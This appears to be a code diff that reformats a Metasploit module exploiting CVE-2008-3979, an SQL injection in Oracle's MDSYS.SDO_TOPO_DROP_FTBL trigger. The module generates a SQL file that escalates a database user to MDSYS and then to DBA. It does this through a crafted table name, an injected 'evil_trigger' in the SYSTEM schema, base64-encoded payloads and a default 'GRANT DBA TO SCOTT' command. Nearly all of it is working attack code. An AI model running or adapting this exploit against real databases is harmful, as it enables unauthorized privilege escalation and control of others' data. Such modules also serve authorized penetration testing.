@@ -7,51 +7,59 @@ class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::FILEFORMAT
 
   def initialize(info = {})
-    super(update_info(info,
-      'Name'           => 'Oracle DB SQL Injection in MDSYS.SDO_TOPO_DROP_FTBL Trigger',
-      'Description'    => %q{
+    super(
+      update_info(
+        info,
+        'Name' => 'Oracle DB SQL Injection in MDSYS.SDO_TOPO_DROP_FTBL Trigger',
+        'Description' => %q{
           This module will escalate an Oracle DB user to MDSYS by exploiting a sql injection bug in
           the MDSYS.SDO_TOPO_DROP_FTBL trigger. After that exploit escalate user to DBA using "CREATE ANY TRIGGER" privilege
           given to MDSYS user by creating evil trigger in system scheme (2-stage attack).
-      },
-      'Author'         => [ 'Sh2kerr <research[ad]dsec.ru>' ],
-      'License'        => MSF_LICENSE,
-      'References'     =>
-        [
+        },
+        'Author' => [ 'Sh2kerr <research[ad]dsec.ru>' ],
+        'License' => MSF_LICENSE,
+        'References' => [
           [ 'CVE', '2008-3979' ],
           [ 'OSVDB', '51354' ],
           [ 'URL', 'http://www.securityfocus.com/archive/1/500061' ],
           [ 'URL', 'http://www.ngssoftware.com/' ],
         ],
-      'DisclosureDate' => '2009-01-13'))
+        'DisclosureDate' => '2009-01-13',
+        'Notes' => {
+          'Stability' => [CRASH_SAFE],
+          'SideEffects' => [IOC_IN_LOGS],
+          'Reliability' => []
+        }
+      )
+    )
 
-      register_options(
-        [
-          OptString.new('SQL',      [ false, 'The SQL to execute.',  'GRANT DBA TO SCOTT']),
-          OptString.new('USER',      [ false, 'The current user. ',  'SCOTT']),
-          OptString.new('FILENAME', [ false, 'The file name.',  'msf.sql'])
-        ])
+    register_options(
+      [
+        OptString.new('SQL', [ false, 'The SQL to execute.', 'GRANT DBA TO SCOTT']),
+        OptString.new('USER', [ false, 'The current user. ', 'SCOTT']),
+        OptString.new('FILENAME', [ false, 'The file name.', 'msf.sql'])
+      ]
+    )
   end
 
   def run
-    name1  = Rex::Text.rand_text_alpha_upper(rand(10) + 1)
-    name2 = Rex::Text.rand_text_alpha_upper(rand(10) + 1)
-    rand1 = Rex::Text.rand_text_alpha_upper(rand(10) + 1)
-    rand2 = Rex::Text.rand_text_alpha_upper(rand(10) + 1)
-    rand3 = Rex::Text.rand_text_alpha_upper(rand(10) + 1)
-    rand4 = Rex::Text.rand_text_alpha_upper(rand(10) + 1)
-    rand5 = Rex::Text.rand_text_alpha_upper(rand(10) + 1)
+    name1 = Rex::Text.rand_text_alpha_upper(1..10)
+    name2 = Rex::Text.rand_text_alpha_upper(1..10)
+    rand1 = Rex::Text.rand_text_alpha_upper(1..10)
+    rand2 = Rex::Text.rand_text_alpha_upper(1..10)
+    rand3 = Rex::Text.rand_text_alpha_upper(1..10)
+    rand4 = Rex::Text.rand_text_alpha_upper(1..10)
+    rand5 = Rex::Text.rand_text_alpha_upper(1..10)
 
-    function1 = %Q|
+    function1 = %(
       CREATE OR REPLACE PROCEDURE #{name1}
       AUTHID CURRENT_USER AS
       PRAGMA AUTONOMOUS_TRANSACTION;
       BEGIN EXECUTE IMMEDIATE '#{datastore['SQL']}';
       END;
-      |
+      )
 
-
-    function2 = %Q|
+    function2 = %|
       CREATE OR REPLACE FUNCTION #{name2} RETURN number AUTHID CURRENT_USER is
       PRAGMA AUTONOMOUS_TRANSACTION;
       STMT VARCHAR2(400):= 'create or replace trigger system.evil_trigger before insert on system.DEF$_TEMP$LOB DECLARE msg VARCHAR2(10);
@@ -64,20 +72,19 @@ class MetasploitModule < Msf::Auxiliary
       END;
       |
 
-    prepare ="create table \"O' and 1=#{datastore['USER']}.#{name2}--\"(id number)"
+    prepare = "create table \"O' and 1=#{datastore['USER']}.#{name2}--\"(id number)"
 
-    exploiting1 ="drop table \"O' and 1=#{datastore['USER']}.#{name2}--\""
+    exploiting1 = "drop table \"O' and 1=#{datastore['USER']}.#{name2}--\""
 
     exploiting2 = "insert into system.DEF$_TEMP$LOB (TEMP$BLOB) VALUES ('AA')"
 
-    fun1  = Rex::Text.encode_base64(function1)
+    fun1 = Rex::Text.encode_base64(function1)
     fun2 = Rex::Text.encode_base64(function2)
-    prp  = Rex::Text.encode_base64(prepare)
+    prp = Rex::Text.encode_base64(prepare)
     exp1 = Rex::Text.encode_base64(exploiting1)
     exp2 = Rex::Text.encode_base64(exploiting2)
 
-
-    sql = %Q|
+    sql = %|
       DECLARE
       #{rand1} VARCHAR2(32767);
       #{rand2} VARCHAR2(32767);
@@ -103,10 +110,7 @@ class MetasploitModule < Msf::Auxiliary
       DROP FUNCTION #{name2};
       |
 
-
     print_status("Creating '#{datastore['FILENAME']}' file ...")
     file_create(sql)
-
-
   end
 end
